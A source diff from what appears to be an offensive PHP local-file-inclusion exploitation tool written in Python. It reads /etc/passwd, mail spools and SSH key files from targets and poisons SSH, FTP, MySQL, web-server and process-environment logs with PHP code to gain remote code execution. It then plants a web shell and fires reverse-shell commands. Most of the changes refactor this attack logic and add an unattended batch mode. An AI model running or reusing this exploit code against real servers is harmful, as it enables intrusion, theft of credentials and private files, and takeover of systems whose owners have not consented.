@@ -4,32 +4,31 @@ import threading
 import time
 import urllib.parse
 import urllib.parse
+from queue import Queue
 from threading import Thread
 
 import regex
 import requests
-from requests import Response
-from requests.exceptions import ProxyError
-
 from core.closable_http_server import run_http_server
 from core.constants import *
 from core.constants import LOG_STACKTRACE_ON, LOG_DYNAMIC_PARAMETER, LOG_CONTENT_NOT_STABLE, LOG_CONTENT_STABLE
 from core.filter_bypass import get_bypass_possibilities
 from core.io import get_resource, save
-from core.log import info, ask, warn, verbose, success, err
+from core.log import info, ask, warn, verbose, success, err, set_global_verbose, is_verbose_mode
 from core.misc import dict_inject_marker, get_web_shell_post_cmd_src
 from core.misc import get_web_shell_src
 from core.mode import Mode
 from core.models.req_input import InputRequest
 from core.models.sock_address import SockAddress
 from core.net import ssh_login, silent_kill_http_server, get_external_ip, ftp_login, mysql_login
-from core.parse_utils import base64_decode_utf_8, get_possible_base64_strings, replace_b64_strings, parse_etc_passwd, \
+from core.parse_utils import base64_decode_utf_8, get_possible_base64_strings, parse_etc_passwd, \
     is_valid_port, is_valid_ip, base64_encode_utf_8, decode_possible_base64_strings, is_valid_url, extract_cmd_response
 from core.payload_data import core_get_by_name, core_get_common_doc_roots, core_get_linux_fuzz_arr, \
     core_get_log_files, core_get_home_rel, core_get_rev_shell_json_arr, core_get_proc_files
 from core.str_utils import contains_words, join_char, substr, remove_prefix, longestCommonPrefix, longestCommonSuffix, \
     remove_suffix, random_str
-from queue import Queue
+from requests import Response
+from requests.exceptions import ProxyError
 
 """
 Http based shell supporting multiple modes
@@ -47,6 +46,10 @@ class Webshell:
         self.file_to_include = log_file_to_include
 
     def run(self):
+
+        is_verbose = is_verbose_mode()
+
+        set_global_verbose(False)
 
         self.current_directory = self.exec("pwd").strip("\\s")
 
@@ -89,6 +92,8 @@ class Webshell:
 
                 self.send_raw_cmd(rev_shell_cmd)
 
+        set_global_verbose(is_verbose)
+
     def exec(self, cmd):
         if not self.current_directory:
             self.current_directory = "."
@@ -115,9 +120,11 @@ class Webshell:
             payload = "expect://" + cmd
             response = self.scan.send_payload(payload=payload)
         elif self.mode == Mode.log:
-            response = self.scan.send_payload(payload=self.file_to_include, method="POST", data={"cmd": cmd})
+            response = self.scan.send_payload(payload=self.file_to_include, method="POST",
+                                              data={WEB_SHELL_PARAM_NAME: cmd})
         elif self.mode == Mode.session:
-            response = self.scan.send_payload(payload=self.file_to_include, method="POST", data={"cmd": cmd})
+            response = self.scan.send_payload(payload=self.file_to_include, method="POST",
+                                              data={WEB_SHELL_PARAM_NAME: cmd})
         else:
             err("Unsupported mode for web shell", exit=True)
         return response
@@ -126,7 +133,7 @@ class Webshell:
 
         cmd_result = None
         try:
-            cmd_result = response.headers[WEB_SHELL_HEADER]
+            cmd_result = response.headers[WEB_SHELL_RESPONSE_HEADER]
         except:
             pass
 
@@ -271,9 +278,10 @@ class Scan:
     amount_payloads_sent = 0
 
     def __init__(self, req_input: InputRequest, proxy=None, follow_redirects=None, address: SockAddress = None,
-                 http_port=None, output_dir=None,
+                 http_port=None, output_dir=None, batch=False,
                  mode=Mode.all, input_mode_params=None):
         self.mode = mode
+        self.batch = batch
         self.input_mode_params = input_mode_params
         self.domain = req_input.host
         self.url_script_path = req_input.url_script_path
@@ -363,7 +371,7 @@ class Scan:
             return
 
         if is_valid_url(info_path):
-            cmd = ask("Enter (shell-)command to execute: ")
+            cmd = ask("Enter Shell-Command to execute: ")
             exploit = PhpInfoLfiExploit(self, info_path, cmd)
             exploit.start()
         else:
@@ -465,7 +473,7 @@ class Scan:
                 break
 
         if inc:
-            success(f"RCE via PHP Sessions possible.\nTry injecting <'{get_web_shell_post_cmd_src()}'>")
+            success(f"RCE via PHP Sessions possible.\nTry injecting \"{get_web_shell_post_cmd_src()}\"")
 
     def start_proc_check(self):
 
@@ -488,20 +496,29 @@ class Scan:
         info("Check Log Poisoning")
 
         try:
-            self.target_ftp_port = is_valid_port(self.input_mode_params[0])
+            self.target_ftp_port = self.input_mode_params[0]
         except:
+            pass
+
+        if not is_valid_port(self.target_ftp_port):
             self.target_ftp_port = TARGET_DEFAULT_FTP_PORT
             warn(f"Defaulting FTP to {TARGET_DEFAULT_FTP_PORT}")
 
         try:
-            self.target_ssh_port = is_valid_port(self.input_mode_params[1])
+            self.target_ssh_port = self.input_mode_params[1]
         except:
+            pass
+
+        if not is_valid_port(self.target_ssh_port):
             self.target_ssh_port = TARGET_DEFAULT_SSH_PORT
             warn(f"Defaulting SSH to {TARGET_DEFAULT_SSH_PORT}")
 
         try:
-            self.target_mysql_port = is_valid_port(self.input_mode_params[2])
+            self.target_mysql_port = self.input_mode_params[2]
         except:
+            pass
+
+        if not is_valid_port(self.target_mysql_port):
             self.target_mysql_port = TARGET_DEFAULT_MYSQL_PORT
             warn(f"Defaulting MySQL to {TARGET_DEFAULT_MYSQL_PORT}")
 
@@ -560,7 +577,7 @@ class Scan:
 
         if self.filter_bypass:
 
-            auto_fuzz = False
+            auto_fuzz = self.batch
 
             while not auto_fuzz:
 
@@ -610,7 +627,7 @@ class Scan:
 
         info("Check Fuzz")
 
-        auto_fuzz = False
+        auto_fuzz = self.batch
 
         while not auto_fuzz:
             file_name = ask("[q=Quit][a=Auto-Fuzz] Enter File: ")
@@ -801,8 +818,6 @@ class Scan:
 
     def try_rce_file_without_bypass(self, payload: dict, save_as_file=None, hide_debug=False, **kwargs) -> bool:
 
-        is_success: bool = False
-
         file_to_include = payload['file']
 
         if save_as_file is None:
@@ -813,250 +828,246 @@ class Scan:
         if "Permission denied in" in response:
             if not hide_debug:
                 warn("No permission to view %s" % file_to_include)
-        elif "failed to open stream" in response:
+
+        if "failed to open stream" in response:
             if not hide_debug:
                 # warn("Failed opening %s" % file_to_include)
                 pass
-        else:
-            success_words = payload.get('successWords')
-            success_regex = payload.get('successRegex')
 
-            try:
+        success_words = payload.get('successWords')
+        success_regex = payload.get('successRegex')
 
-                if success_words:
-                    is_success = contains_words(response, success_words)
-                elif success_regex:
-                    is_success = bool(regex.match(response, success_regex))
-                else:
-                    warn("No validation for " + save_as_file)
-                    is_success = False
+        try:
 
-                if is_success:
+            if success_words:
+                is_success = contains_words(response, success_words)
+            elif success_regex:
+                is_success = bool(regex.match(response, success_regex))
+            else:
+                warn("No validation for " + save_as_file)
+                is_success = False
 
-                    msg = payload.get('onSuccess')
-                    if msg:
-                        success(msg)
+            if is_success:
 
-                    save(save_as_file, self.output_dir, response)
+                msg = payload.get('onSuccess')
+                if msg:
+                    success(msg)
 
-                    # check if we can do more than just download file
+                save(save_as_file, self.output_dir, response)
 
-                    rce_id = payload.get('rce')
+                rce_id = payload.get('rce')
 
-                    if rce_id and (
-                            rce_id not in self.rce_runs):
+                # remember old attempts
+                if rce_id and (rce_id not in self.rce_runs):
 
-                        if rce_id != RCE_MAIL and rce_id != RCE_SESSION and rce_id != RCE_PROC_ENV:  # multiple attempts allowed for these
-                            self.rce_runs.append(rce_id)
+                    if rce_id in [RCE_SSH_LOG, RCE_FTP_LOG, RCE_VIA_MYSQL_LOG]:
+                        self.rce_runs.append(rce_id)
 
-                        php_timestamp_check_payload = self.php_exec_print_timestamp()
-                        php_web_shell_payload = get_web_shell_post_cmd_src()
+                    php_timestamp_check_payload = self.php_exec_print_timestamp()
+                    php_web_shell_payload = get_web_shell_post_cmd_src()
 
-                        success("Possible RCE method found %s" % file_to_include)
+                    success("Possible RCE method found %s" % file_to_include)
 
-                        if rce_id == RCE_VIA_SSH_KEYS:
-                            info("Parsing /etc/passwd ..")
+                    if rce_id == RCE_VIA_SSH_KEYS:
+                        info("Parsing /etc/passwd ..")
 
-                            response = self.send_payload_and_cut(payload=file_to_include, **kwargs)
+                        response = self.send_payload_and_cut(payload=file_to_include, **kwargs)
 
-                            all_folders = parse_etc_passwd(response)
+                        all_folders = parse_etc_passwd(response)
 
-                            home_folders = []
+                        home_folders = []
 
-                            for folder in all_folders:
+                        for folder in all_folders:
 
-                                if "/www" in folder or "/html" in folder:
-                                    self.document_root = folder
+                            if "/www" in folder or "/html" in folder:
+                                self.document_root = folder
 
-                                if "/home/" in folder:
-                                    home_folders.append(folder)
-                                    info(f"Found home folder: {folder}")
-                                    pass
+                            if "/home/" in folder:
+                                home_folders.append(folder)
+                                info(f"Found home folder: {folder}", bold=True)
+                                pass
 
-                            # check for ssh keys, mail file, and other sensitive files
-                            for home_folder in home_folders:
+                        # check for ssh keys, mail file, and other sensitive files
+                        for home_folder in home_folders:
 
-                                mail_file = home_folder.replace("/home/", "/var/mail/")
+                            mail_file = home_folder.replace("/home/", "/var/mail/")
 
-                                info(f"Check {mail_file}")
+                            info(f"Check {mail_file}")
 
-                                file = {
+                            file = {
+                                "file": mail_file,
+                                "successWords": [
+                                    "Message-Id:",
+                                    "MIME-Version",
+                                    "Return-Path"
+                                ]
+                            }
+
+                            included = self.try_include_file_with_bypass(payload=file)
+
+                            if included:
+                                # check if user already poisoned mails
+
+                                entry = {
                                     "file": mail_file,
                                     "successWords": [
-                                        "Message-Id:",
-                                        "MIME-Version",
-                                        "Return-Path"
-                                    ]
+                                        WEB_SHELL_PARAM_MISSING
+                                    ],
+                                    "rce": RCE_MAIL
                                 }
 
-                                included = self.try_include_file_with_bypass(payload=file)
+                                inc = self.try_include_file_with_bypass(entry)
 
-                                if included:
-                                    # check if user already poisoned mails
-
-                                    entry = {
-                                        "file": mail_file,
-                                        "successWords": [
-                                            WEB_SHELL_PARAM_MISSING
-                                        ],
-                                        "rce": RCE_MAIL
-                                    }
-
-                                    self.try_include_file_with_bypass(entry)
-
+                                if inc:
                                     success(
-                                        f"Mail poisoning possible via <'{mail_file}'>.\nTry injecting <'{get_web_shell_post_cmd_src()}'>")
+                                        f"Mail poisoning possible via <'{mail_file}'>.\nTry injecting \"{get_web_shell_post_cmd_src()}\"")
 
-                                # ssh and other user files
+                            # ssh and other user files
 
-                                home_files = core_get_home_rel()
+                            home_files = core_get_home_rel()
 
-                                for home_file in home_files:
-                                    entry_copy = dict(home_file)
+                            for home_file in home_files:
+                                entry_copy = dict(home_file)
 
-                                    files = entry_copy['file']
+                                files = entry_copy['file']
 
-                                    if isinstance(files, list):
-                                        for file in files:
-                                            deep_copy = dict(entry_copy)
-                                            deep_copy['file'] = home_folder + "/" + file
-                                            self.try_include_file_with_bypass(deep_copy)
-                                    else:
-                                        entry_copy['file'] = home_folder + "/" + files
-                                        self.try_include_file_with_bypass(entry_copy)
+                                if isinstance(files, list):
+                                    for file in files:
+                                        deep_copy = dict(entry_copy)
+                                        deep_copy['file'] = home_folder + "/" + file
+                                        self.try_include_file_with_bypass(deep_copy)
+                                else:
+                                    entry_copy['file'] = home_folder + "/" + files
+                                    self.try_include_file_with_bypass(entry_copy)
 
-                        elif rce_id == RCE_SSH_LOG:
-                            info(f"Attempt poisoning SSH login (port={self.target_ssh_port})")
+                    elif rce_id == RCE_SSH_LOG:
+                        info(f"Attempt poisoning SSH login (port={self.target_ssh_port})")
 
-                            ssh_reach = ssh_login(self.domain, php_timestamp_check_payload, "pass123",
-                                                  self.target_ssh_port)
+                        ssh_reach = ssh_login(self.domain, php_timestamp_check_payload, "pass123",
+                                              self.target_ssh_port)
 
-                            response = self.send_payload_and_cut(payload=file_to_include)
+                        response = self.send_payload_and_cut(payload=file_to_include)
 
-                            if ssh_reach and self.unique_identifier in response:
-                                success("RCE via SSH log poisoning")
+                        if ssh_reach and self.unique_identifier in response:
+                            success("RCE via SSH log poisoning")
 
-                                # init web shell
-                                ssh_login(self.domain, php_web_shell_payload, "pass123", self.target_ssh_port)
+                            # init web shell
+                            ssh_login(self.domain, php_web_shell_payload, "pass123", self.target_ssh_port)
 
-                                web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
-                                web_shell.run()
-                            else:
-                                reason = ""
-                                if not ssh_reach:
-                                    reason = f"[Reason: SSH error via port {self.target_ssh_port}]"
-                                err(f"SSH Not exploitable {reason}")
-
-                        elif rce_id == RCE_FTP_LOG:
-                            info(f"Attempt poisoning FTP login (port={self.target_ftp_port})")
-
-                            ssh_reach = ftp_login(self.domain, php_timestamp_check_payload, "pass123",
-                                                  self.target_ftp_port)
-
-                            response = self.send_payload_and_cut(payload=file_to_include)
-
-                            if ssh_reach and self.unique_identifier in response:
-                                success("RCE via FTP log poisoning")
-
-                                # init web shell
-                                ftp_login(self.domain, php_web_shell_payload, "pass123", self.target_ftp_port)
-
-                                web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
-                                web_shell.run()
-                            else:
-                                reason = ""
-                                if not ssh_reach:
-                                    reason = f"[Reason: FTP error via port {self.target_ftp_port}]"
-                                err(f"FTP Not exploitable {reason}")
-
-                        elif rce_id == RCE_VIA_MYSQL_LOG:
-                            info(f"Attempt poisoning MySQL login (port={self.target_mysql_port})")
-
-                            mysql_reach = mysql_login(self.domain, php_timestamp_check_payload, "pass123",
-                                                      self.target_mysql_port)
-
-                            response = self.send_payload_and_cut(payload=file_to_include)
-
-                            if mysql_reach and self.unique_identifier in response:
-                                success("RCE via MySQL log poisoning")
-
-                                # init web shell
-                                mysql_login(self.domain, php_web_shell_payload, "pass123", self.target_mysql_port)
-
-                                web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
-                                web_shell.run()
-                            else:
-                                reason = ""
-                                if not mysql_reach:
-                                    reason = f"[Reason: MySQL error via port {self.target_mysql_port}]"
-                                err(f"MySQL Not exploitable {reason}")
-
-                        elif rce_id == RCE_HTTP_LOG:
-
-                            self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})
-
-                            response = self.send_payload_and_cut(payload=file_to_include)
-
-                            if self.unique_identifier in response:
-                                success("RCE via webserver log poisoning")
-
-                                # init web shell
-                                self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})
-
-                                web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
-                                web_shell.run()
-                            else:
-                                err("Webserver logs not exploitable")
-
-
-                        elif rce_id == RCE_MAIL:
-
-                            if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
-                                # init web shell
-
-                                web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
-                                web_shell.run()
-
-
-                        elif rce_id == RCE_SESSION:
-
-                            if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
-                                # init web shell
-
-                                web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
-                                web_shell.run()
-
-                        elif rce_id == RCE_PROC_ENV:
-
-                            self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})
-
-                            response = self.send_payload_and_cut(payload=file_to_include)
-
-                            if self.unique_identifier in response:
-                                success("RCE via process env")
-
-                                # init web shell
-                                self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})
-
-                                web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
-                                web_shell.run()
-                            else:
-                                err("Process env not exploitable")
-
-                        elif rce_id == RCE_PROC_FD:
-                            pass
-
+                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
+                            web_shell.run()
                         else:
-                            err(f"Unknown RCE exploit with ID {rce_id}")
+                            reason = ""
+                            if not ssh_reach:
+                                reason = f"[Reason: SSH error via port {self.target_ssh_port}]"
+                            err(f"SSH Not exploitable {reason}")
 
+                    elif rce_id == RCE_FTP_LOG:
+                        info(f"Attempt poisoning FTP login (port={self.target_ftp_port})")
 
+                        ssh_reach = ftp_login(self.domain, php_timestamp_check_payload, "pass123",
+                                              self.target_ftp_port)
 
-            except Exception as e:
-                import traceback
-                err("There was an unknown error for <'%s'>\n%s" % (file_to_include, str(e)))
-                traceback.print_exc()
-                sys.exit(0)
-                pass
+                        response = self.send_payload_and_cut(payload=file_to_include)
+
+                        if ssh_reach and self.unique_identifier in response:
+                            success("RCE via FTP log poisoning")
+
+                            # init web shell
+                            ftp_login(self.domain, php_web_shell_payload, "pass123", self.target_ftp_port)
+
+                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
+                            web_shell.run()
+                        else:
+                            reason = ""
+                            if not ssh_reach:
+                                reason = f"[Reason: FTP error via port {self.target_ftp_port}]"
+                            err(f"FTP Not exploitable {reason}")
+
+                    elif rce_id == RCE_VIA_MYSQL_LOG:
+                        info(f"Attempt poisoning MySQL login (port={self.target_mysql_port})")
+
+                        mysql_reach = mysql_login(self.domain, php_timestamp_check_payload, "pass123",
+                                                  self.target_mysql_port)
+
+                        response = self.send_payload_and_cut(payload=file_to_include)
+
+                        if mysql_reach and self.unique_identifier in response:
+                            success("RCE via MySQL log poisoning")
+
+                            # init web shell
+                            mysql_login(self.domain, php_web_shell_payload, "pass123", self.target_mysql_port)
+
+                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
+                            web_shell.run()
+                        else:
+                            reason = ""
+                            if not mysql_reach:
+                                reason = f"[Reason: MySQL error via port {self.target_mysql_port}]"
+                            err(f"MySQL Not exploitable {reason}")
+
+                    elif rce_id == RCE_HTTP_LOG:
+
+                        self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})
+
+                        response = self.send_payload_and_cut(payload=file_to_include)
+
+                        if self.unique_identifier in response:
+                            success("RCE via webserver log poisoning")
+
+                            # init web shell
+                            self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})
+
+                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
+                            web_shell.run()
+                        else:
+                            err("Webserver logs not exploitable")
+
+                    elif rce_id == RCE_MAIL:
+
+                        if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
+                            # init web shell
+
+                            web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
+                            web_shell.run()
+
+                    elif rce_id == RCE_SESSION:
+
+                        if WEB_SHELL_PARAM_MISSING in response:  # user injected successfully
+                            # init web shell
+
+                            web_shell = Webshell(self, mode=Mode.session, log_file_to_include=file_to_include)
+                            web_shell.run()
+
+                    elif rce_id == RCE_PROC_ENV:
+
+                        self.send_payload(payload="", extra_headers={"User-Agent": php_timestamp_check_payload})
+
+                        response = self.send_payload_and_cut(payload=file_to_include)
+
+                        if self.unique_identifier in response:
+                            success("RCE via process env")
+
+                            # init web shell
+                            self.send_payload(payload="", extra_headers={"User-Agent": php_web_shell_payload})
+
+                            web_shell = Webshell(self, mode=Mode.log, log_file_to_include=file_to_include)
+                            web_shell.run()
+                        else:
+                            err("Process env not exploitable")
+
+                    elif rce_id == RCE_PROC_FD:
+                        pass
+
+                    else:
+                        err(f"Unknown RCE exploit with ID {rce_id}")
+
+        except Exception as e:
+            import traceback
+            err("There was an unknown error for <'%s'>\n%s" % (file_to_include, str(e)))
+            traceback.print_exc()
+            sys.exit(0)
+            pass
 
         return is_success
 
@@ -1142,7 +1153,7 @@ class Scan:
         if payload in res and not self.param_reflected:
             self.report(LOG_DYNAMIC_PARAMETER)
             self.param_reflected = True
-        if contains_words(res, PHP_STACK_TRACE) and not self.error_reporting_on:
+        if contains_words(res, ERROR_INCLUDE_LOG) and not self.error_reporting_on:
             self.report(LOG_STACKTRACE_ON)
             self.error_reporting_on = True
 
@@ -1265,7 +1276,7 @@ class Scan:
         if self.__document_root:
             return
 
-        info(f"Document Root: {p}")
+        info(f"Document Root: {p}", bold=True)
         self.__document_root = p
 
     @property
